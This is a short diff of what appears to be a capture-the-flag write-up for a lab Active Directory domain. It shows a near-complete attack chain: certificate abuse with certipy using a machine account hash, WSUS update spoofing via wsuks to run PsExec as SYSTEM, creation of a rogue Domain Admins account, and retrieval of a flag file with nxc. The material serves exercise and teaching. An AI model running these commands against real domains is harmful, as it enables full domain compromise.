@@ -30,7 +30,7 @@
     6.  `send`
 11. `certipy req -dc-ip 192.168.109.10 -u SRV$ -hashes 7e4f65f8776fabe11d9e72deb0401a6e -template WebServer -target DC.agile-corp.hacklu -ca agile-corp-Root-CA -dns wsus.agile-corp.hacklu`
 12. `openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:`
-13. `sudo wsuks --WSUS-Server wsus.agile-corp.hacklu --tls-cert wsus.pem --serve-only -c 'PsExec64.exe /accepteula /s powershell.exe "New-ADUser -Name user89834 -AccountPassword $(ConvertTo-SecureString mlOwZvWq9sb31! -AsPlainText -Force) -Enabled $true; Add-ADGroupMember -Identity 'Domain Admins' -Members user89834"'`
+13. `sudo wsuks --WSUS-Server wsus.agile-corp.hacklu --tls-cert wsus.pem --serve-only -c 'PsExec64.exe /accepteula /s powershell.exe "New-ADUser -Name user89834 -AccountPassword $(ConvertTo-SecureString mlOwZvWq9sb31! -AsPlainText -Force) -Enabled $true; Add-ADGroupMember -Identity \"Domain Admins\" -Members user89834"'`
 14. Wait up to 1 minute for WSUS updates on the DC.
 15. `nxc smb 192.168.109.10 -u user89834 -p 'mlOwZvWq9sb31!' --get-file '\Users\Administrator\Desktop\flag.txt' flag.txt`
 
